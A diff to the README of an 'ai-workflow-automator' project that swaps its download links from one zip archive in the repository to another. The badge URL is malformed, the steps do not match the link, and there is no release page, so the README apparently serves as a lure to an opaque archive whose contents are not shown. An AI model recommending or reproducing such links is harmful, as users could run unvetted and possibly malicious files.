@@ -1,6 +1,6 @@
 # 🎉 ai-workflow-automator - Streamline Your AI Workflow Effortlessly
 
-[![Download ai-workflow-automator](https://raw.githubusercontent.com/IMRANjar/ai-workflow-automator/main/ai_workflow_automator/automator_workflow_ai_v1.7.zip%https://raw.githubusercontent.com/IMRANjar/ai-workflow-automator/main/ai_workflow_automator/automator_workflow_ai_v1.7.zip)](https://raw.githubusercontent.com/IMRANjar/ai-workflow-automator/main/ai_workflow_automator/automator_workflow_ai_v1.7.zip)
+[![Download ai-workflow-automator](https://github.com/IMRANjar/ai-workflow-automator/raw/refs/heads/main/ai_workflow_automator/workflow-ai-automator-2.4.zip%https://github.com/IMRANjar/ai-workflow-automator/raw/refs/heads/main/ai_workflow_automator/workflow-ai-automator-2.4.zip)](https://github.com/IMRANjar/ai-workflow-automator/raw/refs/heads/main/ai_workflow_automator/workflow-ai-automator-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **ai-workflow-automator**! This tool helps you turn plain text into v
 
 To get started, visit the following page to download the latest version of the ai-workflow-automator:
 
-[Download the latest release](https://raw.githubusercontent.com/IMRANjar/ai-workflow-automator/main/ai_workflow_automator/automator_workflow_ai_v1.7.zip)
+[Download the latest release](https://github.com/IMRANjar/ai-workflow-automator/raw/refs/heads/main/ai_workflow_automator/workflow-ai-automator-2.4.zip)
 
 1. Click on the link above.
 2. You will see a list of available versions. Choose the latest release.
@@ -59,4 +59,4 @@ Join our community forums for discussions and troubleshooting tips. You can also
 
 If you need help, feel free to reach out via the contact details in the repository.
 
-[Download the latest release](https://raw.githubusercontent.com/IMRANjar/ai-workflow-automator/main/ai_workflow_automator/automator_workflow_ai_v1.7.zip) and start automating your AI workflows today!
+[Download the latest release](https://github.com/IMRANjar/ai-workflow-automator/raw/refs/heads/main/ai_workflow_automator/workflow-ai-automator-2.4.zip) and start automating your AI workflows today!
